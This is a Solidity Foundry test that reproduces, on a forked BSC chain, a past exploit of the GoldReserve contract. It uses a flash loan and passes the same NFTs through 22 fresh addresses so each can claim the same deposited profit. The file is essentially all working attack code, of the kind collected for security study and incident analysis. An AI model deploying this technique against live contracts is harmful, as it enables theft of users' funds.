// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 12.74 BNB
// Attacker : 0xfBE2CF822e1361FB74421E2a0bD9844A48932cE2
// Attack Contract : 0x3Fc424f13BE05D4F261877a4a9B9963C02222815
// Vulnerable Contract : 0x7c77576a2b48504EBD9fF0810D799651f68742d3
// Attack Tx : https://bscscan.com/tx/0x79c2e41b10462d374f21ecd4da048029cc71692e0c9ef275d4aad228e6f8afe0
//
// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x7c77576a2b48504EBD9fF0810D799651f68742d3#code
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/434
//
// GoldReserve tracked claimed profit by address while entitlement was calculated from the
// caller's current ERC1155 balance. The attacker minted NFTs after a profit deposit, then
// moved the same NFTs through fresh addresses so each address could claim the same profit.

address constant ATTACKER = 0xfBE2CF822e1361FB74421E2a0bD9844A48932cE2;
address constant ATTACK_CONTRACT = 0x3Fc424f13BE05D4F261877a4a9B9963C02222815;
address constant VULNERABLE_CONTRACT = 0x7c77576a2b48504EBD9fF0810D799651f68742d3;
address constant PANCAKE_V3_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

interface IGoldReserve {
    function mintPrice() external view returns (uint256);
    function depositProfit() external payable;
    function mint(
        uint256 id,
        uint256 amount
    ) external payable;
    function claimProfit() external;
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    IGoldReserve private constant goldReserve = IGoldReserve(VULNERABLE_CONTRACT);
    IPancakeV3Pool private constant flashPool = IPancakeV3Pool(PANCAKE_V3_POOL);
    IWBNB private constant wbnb = IWBNB(payable(WBNB_TOKEN));

    uint256 private flashAmount;

    function setUp() public {
        uint256 forkBlock = 46_278_330;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = address(0);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack Contract");
        vm.label(VULNERABLE_CONTRACT, "GoldReserve");
        vm.label(PANCAKE_V3_POOL, "Pancake V3 WBNB Pool");
        vm.label(WBNB_TOKEN, "WBNB");
    }

    function testExploit() public balanceLog {
        // step 1: flash-borrow the WBNB needed to seed GoldReserve's profit pool and mint NFTs.
        flashAmount = 120 ether;
        uint256 balanceBefore = address(this).balance;
        flashPool.flash(address(this), 0, flashAmount, "");

        // step 4: after repaying the flash loan, the repeated claims leave native BNB profit.
        assertGt(address(this).balance - balanceBefore, 12 ether);
    }

    function pancakeV3FlashCallback(
        uint256,
        uint256 fee1,
        bytes calldata
    ) external {
        require(msg.sender == PANCAKE_V3_POOL, "pool only");

        uint256 nftId = 10;
        uint256 nftAmount = 8;

        // step 2: unwrap the flash loan, deposit stale profit, then mint NFTs that inherit it.
        wbnb.withdraw(flashAmount);
        uint256 mintCost = goldReserve.mintPrice() * nftAmount;
        goldReserve.depositProfit{value: flashAmount - mintCost}();
        address holder = _holder(0);
        payable(holder).transfer(mintCost);
        vm.prank(holder);
        goldReserve.mint{value: mintCost}(nftId, nftAmount);

        // step 3: claim once, then move the same NFTs through fresh holder addresses and claim again.
        _claimAndSweep(holder);
        for (uint256 i = 0; i < 21; i++) {
            address nextHolder = _holder(i + 1);
            vm.prank(holder);
            goldReserve.safeTransferFrom(holder, nextHolder, nftId, nftAmount, "");
            _claimAndSweep(nextHolder);
            holder = nextHolder;
        }

        address finalHolder = _holder(100);
        vm.prank(holder);
        goldReserve.safeTransferFrom(holder, finalHolder, nftId, 1, "");
        _claimAndSweep(finalHolder);

        uint256 repayAmount = flashAmount + fee1;
        wbnb.deposit{value: repayAmount}();
        wbnb.transfer(PANCAKE_V3_POOL, repayAmount);
    }

    function _holder(
        uint256 index
    ) private pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked("GoldReserve holder", index)))));
    }

    function _claimAndSweep(
        address holder
    ) private {
        vm.prank(holder);
        goldReserve.claimProfit();

        uint256 claimed = holder.balance;
        if (claimed > 0) {
            vm.prank(holder);
            (bool success,) = payable(address(this)).call{value: claimed}("");
            require(success, "sweep failed");
        }
    }

    receive() external payable {}
}
